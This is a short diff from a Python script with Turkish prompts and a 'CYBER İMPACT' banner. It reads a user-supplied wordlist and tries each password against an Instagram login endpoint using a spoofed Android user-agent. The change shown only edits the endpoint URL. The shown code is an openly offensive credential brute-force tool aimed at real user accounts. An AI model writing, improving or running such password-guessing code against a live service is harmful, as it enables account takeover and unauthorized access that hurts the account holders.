@@ -10,7 +10,7 @@ passlist=input(S+'[◇] Wordlist giriniz ==> ')
 print('======CYBER İMPACT=========')
 for Whisper in open(passlist,'r').read().splitlines():
  password=str(Whisper.split('\n')[0])
- url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+ url = 'https://b.i.instagram.com/accounts/login/'
  headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
  data = {'uuid':uid, 
          'password':password, 
